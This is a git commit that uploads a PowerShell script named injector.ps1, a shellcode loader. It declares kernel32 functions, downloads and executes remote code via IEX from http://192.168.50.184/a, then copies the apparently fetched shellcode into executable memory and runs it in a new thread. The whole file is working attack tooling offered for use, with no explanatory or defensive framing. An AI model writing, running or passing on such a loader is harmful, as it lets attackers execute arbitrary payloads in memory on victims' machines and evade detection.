ab31530d47450e9c3799d351e5d1ce5205ba9600
roflsandwich <11023955+roflsandwich@users.noreply.github.com>
2023-09-14 22:01:21 +0100

    Add files via upload

---
+++ injector.ps1
@@ -0,0 +1,23 @@
+﻿$Win32 = @"
+    using System;
+	  using System.Runtime.InteropServices;
+	
+    public class Win32 {
+    	[DllImport("kernel32")]
+	    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+	        
+	[DllImport("kernel32", CharSet = CharSet.Ansi)]
+	    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+	        
+    	[DllImport("kernel32.dll", SetLastError=true)]
+	    public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
+
+    }	        
+"@
+Add-Type $Win32; 
+IEX (curl.exe http://192.168.50.184/a)
+$size = $nice.Length;
+[IntPtr]$addr = [Win32]::VirtualAlloc(0, $size, 0x3000, 0x40);	
+[System.Runtime.InteropServices.Marshal]::Copy($nice, 0, $addr, $size);
+$handling = [Win32]::CreateThread(0, 0, $addr, 0, 0, 0);
+[Win32]::WaitForSingleObject($handling, [uint32]"0xFFFFFFFF");
